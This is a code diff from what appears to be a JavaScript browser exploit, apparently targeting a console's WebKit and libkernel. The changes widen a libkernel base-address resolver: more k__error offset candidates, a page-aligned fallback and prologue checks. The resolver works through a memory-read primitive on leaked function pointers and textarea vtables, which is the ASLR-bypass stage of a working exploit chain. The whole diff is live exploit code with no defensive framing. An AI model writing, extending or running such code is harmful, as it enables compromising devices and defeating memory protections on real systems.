@@ -207,7 +207,10 @@ function ptrBig(w) {
     return (BigInt(w.hi >>> 0) << 32n) | BigInt(w.low >>> 0);
 }
 
-const K_ERROR_CANDS = [0x26420, 0x26430, 0x25000, 0x30000, 0xd9d0];
+const K_ERROR_CANDS = [
+    0x26420, 0x26430, 0x25000, 0x30000,
+    0xd9d0, 0x3370, 0x183c0, 0x299c0,
+];
 
 function kErrorCandidates(off) {
     const out = [];
@@ -1968,13 +1971,31 @@ function discoverTextareaVtables(p, opts) {
     return { cells: cells.length, vtables: vtables, cellDbg: cellDbg };
 }
 
+/** Resolve ext import ptr → libkernel base — no fnPtr read, all k__error cands, guarded. */
+export function resolveExtPtrSafe(p, fnPtr, off, webkitBase) {
+    if (!fnPtr || fnPtr.hi < 0x8) return null;
+    const errs = kErrorCandidates(off);
+    for (let i = 0; i < errs.length; i++) {
+        const lk = fnPtr.sub32(errs[i]);
+        if (!plausibleLkBeforeRead(lk, fnPtr, webkitBase, off)) continue;
+        if (!isLibkernelPrologue(p, lk, { fnPtr, webkitBase, off })) continue;
+        return { lk, iatRva: null, fnPtr, via: "error+" + errs[i].toString(16) };
+    }
+    const pageBase = pageAlignDown(fnPtr, 0x4000);
+    if (plausibleLkBeforeRead(pageBase, fnPtr, webkitBase, off)
+        && isLibkernelPrologue(p, pageBase, { fnPtr, webkitBase, off }))
+        return { lk: pageBase, iatRva: null, fnPtr, via: "page" };
+    return null;
+}
+
 /** Resolve ext code ptr → libkernel base — never reads fnPtr (code page OOM on poops). */
 function resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, iatRva, opts) {
     opts = opts || {};
     if (!fnPtr || fnPtr.hi < 0x8) return null;
 
     const errs = kErrorCandidates(off);
-    const errMax = opts.lite ? 1 : Math.min(2, errs.length);
+    const errMax = opts.errMax != null ? opts.errMax
+        : (opts.lite ? errs.length : errs.length);
     for (let i = 0; i < errMax && i < errs.length; i++) {
         const lk = fnPtr.sub32(errs[i]);
         if (!plausibleLkBeforeRead(lk, fnPtr, webkitBase, off)) continue;
@@ -1988,13 +2009,25 @@ function resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, iatRva, opts) {
                 via: "lite-error+" + errs[i].toString(16),
             };
         }
-        const v = verifyLibkernelBase(p, lk, off);
+        const v = verifyLibkernelBase(p, lk, off, { fnPtr, webkitBase, off });
         return {
             lk,
             iatRva,
             fnPtr,
             strong: !!(v.ok && v.strong),
             via: "safe-error+" + errs[i].toString(16),
+        };
+    }
+
+    const pageBase = pageAlignDown(fnPtr, 0x4000);
+    if (plausibleLkBeforeRead(pageBase, fnPtr, webkitBase, off)
+        && isLibkernelPrologue(p, pageBase, { fnPtr, webkitBase, off })) {
+        return {
+            lk: pageBase,
+            iatRva,
+            fnPtr,
+            strong: false,
+            via: "page",
         };
     }
 
@@ -2829,21 +2862,35 @@ function scanGuessCandidatesChunk(p, webkitBase, nativeFn, sub) {
     return { done: false, state: sub, phase: "guess", tried: sub.idx, total: sub.cands.length };
 }
 
-/** Paste libkernel base OR code ptr — ≤8 reads, no walk-back. */
-export function verifyManualLibkernelFromPtrLite(p, raw, off) {
+/** Paste libkernel base OR ext code ptr — guarded k__error scan, no fnPtr read. */
+export function verifyManualLibkernelFromPtrLite(p, raw, off, webkitBase) {
     const ptr = typeof raw === "string" ? parseAddrSync(raw) : raw;
     if (!ptr) return { ok: false, error: "bad address" };
-    const hit = lkFromFnPtrLite(p, ptr, off);
+    if (lkAligned(ptr) && isLibkernelPrologue(p, ptr, { webkitBase, off })) {
+        const v = verifyLibkernelBase(p, ptr, off, { webkitBase, off });
+        if (v.ok) {
+            saveLibkernelSession(ptr, null);
+            return { ok: true, lk: ptr, via: "base", strong: !!v.strong };
+        }
+    }
+    const hit = resolveExtPtrSafe(p, ptr, off, webkitBase);
     if (hit) {
         saveLibkernelSession(hit.lk, hit.iatRva);
-        return { ok: true, lk: hit.lk, via: hit.via };
+        const v = verifyLibkernelBase(p, hit.lk, off, { fnPtr: ptr, webkitBase, off });
+        return {
+            ok: true,
+            lk: hit.lk,
+            via: hit.via,
+            strong: !!(v.ok && v.strong),
+            from: ptr,
+        };
     }
-    return { ok: false, error: "not libkernel" };
+    return { ok: false, error: "not libkernel (tried k__error cands)" };
 }
 
 /** Paste libkernel base OR any code pointer inside libkernel. */
-export function verifyManualLibkernelFromPtr(p, raw, off) {
-    return verifyManualLibkernelFromPtrLite(p, raw, off);
+export function verifyManualLibkernelFromPtr(p, raw, off, webkitBase) {
+    return verifyManualLibkernelFromPtrLite(p, raw, off, webkitBase);
 }
 
 /** Scan mapped RW/data within cap for external code pointers → libkernel walk-back. */
